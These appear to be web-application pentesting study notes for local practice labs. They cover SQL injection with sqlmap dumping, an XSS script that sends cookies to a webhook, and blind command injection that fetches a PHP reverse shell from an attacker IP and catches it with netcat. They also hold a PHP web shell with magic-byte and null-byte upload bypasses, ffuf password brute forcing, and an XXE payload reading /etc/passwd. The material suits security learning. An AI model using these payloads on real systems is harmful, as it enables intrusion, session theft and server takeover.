
Resource ( #Resources #Important ):
- https://appsecexplained.gitbook.io/appsecexplained
- https://github.com/swisskyrepo/PayloadsAllTheThings (Has payloads and bypasses for Web Application Security) / https://swisskyrepo.github.io/PayloadsAllTheThings/
- https://swisskyrepo.github.io/InternalAllTheThings/
- https://www.thehacker.recipes/web/inputs/null-byte-injection
#### Docker installation and usage commands:

- To install docker we need docker.io and docker-compose.
	- `sudo apt install docker.io`
	- `sudo apt install docker-compose`
- To check the version installed
	- `docker --version`
	- `docker-compose --version`
- Once we have a docker-compose.yml file for a lab, navigate to the path were we have the docker-compose.yml file and try the below command:
	- `sudo docker-compose up`
		- This will download the required files for the first time and spin up the containers
	- `sudo docker-compose up -d`
		- This can be used to bring the containers up and run in background
	- `sudo docker-compose stop`
		- This command can be used to stop the containers
- To check the list of containers running, we can use the below command:
	- `sudo docker ps -a`
- To remove the container, we can use the below command
	- `sudo docker rm {container_id`
	- `sudo docker rm $(sudo docker ps -aq)`
		- This will remove all the container without the container id
	

#### SQL Injection:

Useful commands to check if SQL injection is possible:

Inside user search:
- Try ", ' and a username with quote at the start and end to see if this breaks the application, and outputs a stack trace error, from mysql
- `jeremy' or 1=1#`
	- (#) is for terminator or we can also use (-- -) as a terminator for the mysql
	- This will grab all the data in the table
- `jeremy' union select null#`
	- Using union and null, we can find how many columns are selected in the select statement, if you dont see the result with 1 null, try 2 or 3 and see when we will get the results.
- `jeremy' union select null,null,null#`
	- Union will only output, if only the number of columns matches with the first select query, we can use this to grab tables information  in the database.
- `jeremy' union select null, null,table_name from information_schema.tables#`


Useful resource ( #Resources ):

https://portswigger.net/web-security/sql-injection/cheat-sheet

##### SQL Map ( #Tools ):

SQL Map can be used to check the sql injection with the payload, we have try to copy and payload and save it in a file and use the command:
-  `sqlmap -r {filename.txt}`
	- This will run the blind sql tests and see if we have any sql injections possible
- `sqlmap -r {filename2.txt} --dump` 
	- This can be used to dump the details found from the tables, if it finds there is a sql injection possiblity
- `sqlmap -r {filename2.txt} --dump -T {table_name}`
	- If we know the table name, we can dump the details from only that table


#### XSS (Cross Site Scripting):

Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. This can lead to data theft, session hijacking, or spreading malware.

- Reflected: 
	- The script is reflected off a web server and is immediately executed when a user clicks on a malicious link. It is not stored on the server.
- Stored:
	- The malicious script is stored on the server (e.g., in a database) and is served to users who access the affected page.
	- `<script>var i = new Image; i.src="webhookurl/?"+document.cookie;</script>`
		- This is useful to steal the cookie and send it to the web server that is listening
- DOM based:
	- The vulnerability exists in the client-side code (JavaScript) where the script modifies the DOM without proper sanitization, allowing attackers to execute malicious code.
		- Example:
			- `<img src = x onerror = "prompt(1)">`

Note: We can use containers plugin in firefox to mimic multiple users from one system logging in through an web application.


#### Command Injection:

Command injection is a type of security vulnerability that occurs when an attacker is able to execute arbitrary commands on a host operating system via a vulnerable application. This typically happens when an application takes untrusted input and passes it to a system shell or command interpreter without proper validation or sanitization.
##### How it Works:

1. **Input Exploitation**: An attacker manipulates input fields (like forms or URLs) to inject malicious commands.
2. **Execution**: The application executes the injected command with the same privileges as the application, potentially allowing the attacker to gain unauthorized access to the system.
##### Consequences:

- Data theft or modification
- System takeover
- Installation of malware
- Denial of service
##### Prevention:

- Validate and sanitize user inputs.
- Use parameterized queries and prepared statements.
- Employ least privilege principles for application permissions.
- Use security tools to monitor and detect suspicious activities.

##### Blind Command Injection:

In case,we are not able to see the output and not sure if the command is being executed, we can use web hook or have any server to listen and type the command to test,  if the blind command injection is working:
- {webhook_url}?\`whoami\`

We can also use \n to go to next line and execute a command, for example, we are going to grab a file from the python http server, we host in the attacker machine

- `https://google.com \n wget {attacker_IP_address}:81/test`
- In attacker machine, we will have `python3 -m http.server 81`

If we need to pop the shell from the target machine, with blind command injection, we can upload the shell script from attacker machine and listen to that port, to trigger a reverse shell. This is because as the ; and other required characters, are being filter in the search functionality in blind injection.

Grab the php revese shell from the below path:
- `/usr/share/webshells/laundanum/php/php-reverse-shell.php`

Copy it to any location, where you can host the web server with python
- `cp /usr/share/webshells/laundanum/php/php-reverse-shell.php ./tmp`

Gedit the file and update the ip_address and port as required and rename the filename as required to smaller form factor
-  `mv php-reverse-shell.php rev.php`
- `gedit rev..php`

Host the python web server in tmp folder
- `python3 -m http.server 81`

In another command tab, listen for the port mentioned in the reverse shell file
- `nc -nvlp 4444`

In the browser, for blind injection use wget and grab the php file or if that doesn't work we can use curl to grab the file.
- `https://google.com \n wget {attacker_IP_address}:81/rev.php`
- `https://google.com && curl {attacker_IP_address}:81/rev.php > /var/www/html/rev.php`

Once, we have the file in the target machine try to run the file, that is placed in /var/www/html path, with the base url, for example
-  `http://localhost/rev.php`

Observe if the reverse shell is popped in the nc listen in attacker machine, if yes, we are successful with the blind command injection.


#### Insecure File Upload - Basic Bypass:

Through this vulnerability, we can upload a file with malicious code and execute it remotely, to get a shell or any other command.

- We can use php command, {<?php system($_GET['cmd']); ?> } to provide parameters to the php file, with cmd = and the system will execute it
- After the file is uploaded, we can find the path, were it is stored and run the php file and provide the value for the parameter cmd:
	- `http://localhost/labs/uploads/cmd.php?cmd=whoami`

#### Insecure File Upload - Magic Bytes:

- https://www.thehacker.recipes/web/inputs/null-byte-injection (null byte attack)

- We can check the magic bytes of a file, using the command:
	- `file logo.png` or `head logo.png`
- In this attack, we keep the starting magic bytes of an png file and attach the php script for example:
	- PNG .....magic bytes data {<?php system($_GET['cmd']); ?>}
	- As the application is checking with the magic bytes to determine the file type, we will be using this technic to bypass the upload check, and uploading as a php file
- If the checks is being done using the file extension we provide in the filename, we can use the null byte attack to skip the extension
	- `malicious.php%00.pdf`
- We can use other php extensions, if the application is blocking only php, rather than only allowing jpg and png, we can google 'vaild php file extensions' and use of that and see if the upload still works

#### Attacking Authentication - Brute Force:

wordlists path: `/usr/share/seclists/SecLists-master/Passwords/....`

-  We can use intruder in burp suite to brute force the password and provide the wordlists from the seclists/Passwords path and use the "xato-net-10-million-passwords-10000.txt" wordlists and run the attack, as burp suite is throttled it will take some time to complete, once it is completed, we can filter out the results with the content size and check for any difference.
- We can also use ffuf to brute force:
	- `ffuf -request req.txt -request-proto http -w /usr/share/seclists/SecLists-master/Passwords/xato-net-10-million-passwords-10000.txt -fs 1814`
	- req.txt - this file contains the POST request and in the password field we will provide the FUZZ keyword
	- -request-proto - this is the request protocol, here we are using http
	- -w - wordlist
	- -fs  - filter size, if we know the content size of incorrect passwords, we can use that to filter out those and find the entry with different size, to find the actual password
- If we have 2 fields to FUZZ like username and password, in the POST request, we can provide the FUZZ words such as Username=FUZZUSER and Password=FUZZPASS.
	- While running ffuf, we can provide the below command:
		- Ex: `fuff -request teashop.txt -request-proto http -mode clusterbomb -w pass.txt:FUZZPASS -w /usr/share/seclists/SecLists-master/Usernames/top-usernames-shortlist.txt:FUZZUSER -fs 3376`


#### XXE - External Entities Injection:

XXE, or XML External Entity, is a type of security vulnerability that occurs in XML parsers. It allows an attacker to interfere with the processing of XML data by including malicious external entities. This can lead to various issues, such as:

1. **Data Disclosure**: An attacker can extract sensitive information from the server's file system.
2. **Denial of Service (DoS)**: By referencing large files or entities, the server may be overloaded.
3. **Server-side Request Forgery (SSRF)**: An attacker can make the server send requests to internal or external systems.

To mitigate XXE vulnerabilities, developers should:

- Disable external entity processing in XML parsers.
- Use safer data formats like JSON when possible.
- Validate and sanitize XML input.

Example:
`<?xml version="1.0" encoding="UTF-8"?>`
`<!DOCTYPE creds [`
`<!ELEMENT creds ANY >`
`<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>`
`<creds><user>&xxe;</user><password><pass></password></creds>`

#### IDOR (Insecure Direct Object Reference):

IDOR, or Insecure Direct Object References, is a type of security vulnerability that occurs when an application exposes a reference to an internal object (like a file, database record, or other resource) without proper authorization checks. This allows an attacker to manipulate the reference to access or modify objects they shouldn’t have access to.

##### How IDOR Works:

For example, if a web application uses a URL like `example.com/user/123`, an attacker might change the `123` to `124` to access another user's information. If there are no authorization checks in place, they could view or modify that user’s data.

##### Mitigation Strategies:

1. **Authorization Checks**: Always verify that the user has permission to access or modify the requested object.
2. **Use Indirect References**: Instead of exposing direct references, use mapping or tokens that don’t reveal internal identifiers.
3. **Input Validation**: Ensure inputs are validated and sanitized to prevent unauthorized access.

